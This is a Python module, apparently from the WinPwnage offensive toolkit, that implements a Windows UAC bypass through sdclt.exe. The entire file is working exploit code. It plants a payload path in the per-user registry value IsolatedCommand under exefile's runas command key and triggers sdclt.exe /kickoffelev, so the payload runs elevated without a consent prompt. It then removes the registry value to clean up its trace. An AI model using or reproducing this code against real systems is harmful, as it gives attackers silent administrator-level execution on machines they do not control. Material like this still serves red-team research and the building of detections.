from winpwnage.core.prints import *
from winpwnage.core.utils import *
import time
import os

uacMethod5_info = {
	"Description": "UAC bypass using sdclt.exe (IsolatedCommand)",
	"Method": "Method: Registry key (Class) manipulation",	
	"Id": "5",
	"Type": "UAC bypass",
	"Fixed In": "17025" if not information().uac_level() == 4 else "0",
	"Works From": "10240",
	"Admin": False,
	"Function Name": "uacMethod5",
	"Function Payload" : True,
}

def uacMethod5_cleanup(path):
	print_info("Performing cleaning")
	if registry().remove_key(hkey="hkcu", path=path, name="IsolatedCommand", delete_key=False):
		print_success("Successfully cleaned up")
		print_success("All done!")		
	else:
		print_error("Unable to cleanup")
		return False

def uacMethod5(payload):
	if payloads().exe(payload):
		path = "Software\\Classes\\exefile\\shell\\runas\\command"

		if registry().modify_key(hkey="hkcu", path=path, name="IsolatedCommand", value=payloads().exe(payload)[1], create=True):
			print_success("Successfully created IsolatedCommand key containing payload ({payload})".format(payload=os.path.join(payloads().exe(payload)[1])))
		else:
			print_error("Unable to create registry keys")
			return False

		time.sleep(5)

		print_info("Disabling file system redirection")
		with disable_fsr():
			print_success("Successfully disabled file system redirection")
			if process().create("sdclt.exe", params="/kickoffelev"):
				print_success("Successfully spawned process ({})".format(payloads().exe(payload)[1]))
				time.sleep(5)
				uacMethod5_cleanup(path)
			else:
				print_error("Unable to spawn process ({})".format(os.path.join(payloads().exe(payload)[1])))
				for x in Constant.output:
					if "error" in x:
						uacMethod5_cleanup(path)
						return False
	else:
		print_error("Cannot proceed, invalid payload")
		return False